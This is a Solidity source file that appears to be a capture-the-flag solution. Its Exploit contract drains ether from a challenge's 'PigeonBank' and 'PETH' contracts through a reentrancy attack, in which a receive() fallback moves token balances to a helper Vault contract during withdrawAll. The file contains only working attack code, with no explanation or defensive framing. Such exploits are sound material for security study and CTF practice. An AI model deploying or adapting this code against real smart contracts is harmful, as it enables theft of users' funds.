// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "./challenge/Setup.sol";

contract Vault {
    Setup setup;

    constructor(address setupAddress) {
        setup = Setup(payable(setupAddress));
    }

    function transfer() public {
        setup.peth().transfer(msg.sender, setup.peth().balanceOf(address(this)));
    }
}

contract Exploit {
    Setup setup;
    PigeonBank pigeonBank;
    PETH peth;
    Vault vault;
    bool reentry = false;

    function exploit(address setupAddress) public payable {
        setup = Setup(payable(setupAddress));
        pigeonBank = setup.pigeonBank();
        peth = setup.peth();
        vault = new Vault(setupAddress);

        while (address(peth).balance > 0) {
            uint256 value =
                address(this).balance > address(peth).balance ? address(peth).balance : address(this).balance;
            pigeonBank.deposit{value: value}();
            reentry = true;
            pigeonBank.withdrawAll();
            reentry = false;
            vault.transfer();
            pigeonBank.withdrawAll();
        }
        address(payable(msg.sender)).call{value: address(this).balance}("");
    }

    receive() external payable {
        if (reentry) {
            peth.transfer(address(vault), peth.balanceOf(address(this)));
        }
    }
}
